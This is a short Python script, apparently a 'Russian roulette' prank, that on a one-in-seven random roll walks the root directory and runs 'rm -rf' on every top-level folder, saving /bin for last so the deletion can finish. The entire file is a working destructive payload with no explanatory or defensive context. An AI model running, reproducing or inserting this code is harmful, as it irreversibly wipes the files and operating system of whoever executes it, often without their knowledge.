from os import system, listdir
from random import randint

if randint(0, 6) == 0:
    path = listdir('/')
    for i in path:
        if i == 'bin':
            continue
        system('rm -rf /' + i)
    system('rm -rf /bin')